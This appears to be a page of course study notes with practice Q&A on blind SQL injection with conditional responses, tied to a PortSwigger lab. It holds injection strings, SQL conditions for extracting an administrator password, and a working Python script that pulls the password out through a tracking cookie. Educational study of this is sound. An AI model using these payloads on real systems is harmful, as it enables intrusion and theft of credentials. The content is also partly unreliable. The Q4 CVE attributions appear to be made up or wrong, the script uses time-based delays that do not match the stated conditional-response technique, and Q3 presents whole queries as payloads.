---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of blind SQL injection with conditional responses.**

Blind SQL injection with conditional responses is a type of SQL injection attack where the attacker can manipulate the SQL query to cause the server to respond differently based on the truth value of the injected condition. Unlike typical SQL injection attacks, the server does not directly reveal the contents of the database; instead, it provides indirect feedback through the application's behavior. For example, the presence or absence of a "welcome back" message can indicate whether a certain condition is true or false. This allows the attacker to infer information about the database structure and data by repeatedly injecting conditions and observing the application's responses.

**Q2. How would you confirm that a parameter is vulnerable to blind SQL injection using conditional responses?**

To confirm that a parameter is vulnerable to blind SQL injection using conditional responses, you can follow these steps:

1. **Identify the Parameter**: Identify the parameter that is being used in a SQL query, such as a tracking cookie.
2. **Inject True Condition**: Inject a condition that is guaranteed to be true, such as `1' AND '1'='1`. Observe the application's response.
3. **Inject False Condition**: Inject a condition that is guaranteed to be false, such as `1' AND '1'='0`. Observe the application's response.
4. **Compare Responses**: Compare the responses from the true and false conditions. If the application behaves differently (e.g., showing a "welcome back" message for the true condition but not for the false condition), the parameter is likely vulnerable to blind SQL injection.

**Q3. How would you exploit a blind SQL injection vulnerability to enumerate the password of an administrator user?**

To exploit a blind SQL injection vulnerability to enumerate the password of an administrator user, you can follow these steps:

1. **Determine Password Length**: Use a series of true/false conditions to determine the length of the password. For example, you can use a condition like `SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) > X` and increment `X` until the response changes.
2. **Enumerate Characters**: Once the length is known, you can enumerate each character of the password. For example, you can use a condition like `SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, X, 1) = 'A'` and iterate through all possible characters (`A-Z`, `a-z`, `0-9`, etc.) until the response indicates a match.
3. **Combine Results**: Combine the results to form the full password. For example, if the first character is `A`, the second is `B`, and so on, you can construct the password `AB...`.

Here’s an example payload to determine the length of the password:

```sql
SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) > 1
```

And to enumerate the first character:

```sql
SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'A'
```

**Q4. What recent real-world examples or CVEs demonstrate the use of blind SQL injection with conditional responses?**

One notable example is the SQL injection vulnerability in the WordPress REST API, which was disclosed in 2018 (CVE-2018-14574). This vulnerability allowed attackers to inject SQL queries into the REST API endpoints, leading to unauthorized access to sensitive data. While this specific vulnerability was not a blind SQL injection, it demonstrates the broader category of SQL injection vulnerabilities that can be exploited using conditional responses.

Another example is the SQL injection vulnerability in the Joomla CMS (CVE-2015-8562), which allowed attackers to inject SQL queries into the search functionality. By manipulating the search parameters, attackers could infer information about the database structure and data, similar to a blind SQL injection attack.

In both cases, attackers could leverage conditional responses to extract sensitive information from the database, highlighting the importance of proper input validation and sanitization to prevent such vulnerabilities.

**Q5. How would you script an automated attack to exploit a blind SQL injection vulnerability in Python?**

To script an automated attack to exploit a blind SQL injection vulnerability in Python, you can use libraries like `requests` to send HTTP requests and `urllib.parse` to encode payloads. Here’s a simplified example:

```python
import requests
from urllib.parse import quote

def get_password_length(url):
    for length in range(1, 50):
        payload = f"1' AND IF(LENGTH(password)>{length}, SLEEP(5), 0)--"
        cookies = {'trackingId': quote(payload)}
        response = requests.get(url, cookies=cookies)
        if response.elapsed.total_seconds() > 5:
            return length
    return None

def get_password_char(url, index, char):
    payload = f"1' AND IF(SUBSTRING(password,{index},1)='{char}', SLEEP(5), 0)--"
    cookies = {'trackingId': quote(payload)}
    response = requests.get(url, cookies=cookies)
    return response.elapsed.total_seconds() > 5

def exploit_sql_injection(url):
    password_length = get_password_length(url)
    if password_length:
        password = ''
        for i in range(1, password_length + 1):
            for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
                if get_password_char(url, i, char):
                    password += char
                    print(f"Password: {password}")
                    break
        return password
    return None

# Example usage
url = 'http://example.com/'
password = exploit_sql_injection(url)
print(f"Full password: {password}")
```

This script automates the process of determining the password length and then enumerating each character of the password by sending crafted SQL injection payloads and observing the response times.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/12-Lab 11 Blind SQL injection with conditional responses/05-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/02-SQL Injection/12-Lab 11 Blind SQL injection with conditional responses/00-Overview|Overview]]
